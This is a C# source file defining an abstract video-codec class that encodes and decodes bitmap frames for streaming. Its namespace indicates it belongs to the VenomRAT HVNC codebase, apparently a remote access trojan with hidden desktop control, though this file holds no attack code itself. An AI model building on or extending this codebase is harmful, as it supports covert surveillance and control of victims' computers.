using System.Drawing;
using System.IO;
using VenomRAT_HVNC.StreamLibrary.src;

namespace VenomRAT_HVNC.StreamLibrary
{
    public abstract class IVideoCodec
    {
        public abstract event IVideoCodec.VideoCodeProgress onVideoStreamCoding;

        public abstract event IVideoCodec.VideoDecodeProgress onVideoStreamDecoding;

        public abstract event IVideoCodec.VideoDebugScanningDelegate onCodeDebugScan;

        public abstract event IVideoCodec.VideoDebugScanningDelegate onDecodeDebugScan;

        public abstract ulong CachedSize { get; internal set; }

        public int ImageQuality { get; set; }

        public IVideoCodec(int ImageQuality = 100)
        {
            this.jpgCompression = new JpgCompression(ImageQuality);
            this.ImageQuality = ImageQuality;
        }

        public abstract int BufferCount { get; }

        public abstract CodecOption CodecOptions { get; }

        public abstract void CodeImage(Bitmap bitmap, Stream outStream);

        public abstract Bitmap DecodeData(Stream inStream);

        protected JpgCompression jpgCompression;

        public delegate void VideoCodeProgress(Stream stream, Rectangle[] MotionChanges);

        public delegate void VideoDecodeProgress(Bitmap bitmap);

        public delegate void VideoDebugScanningDelegate(Rectangle ScanArea);
    }
}
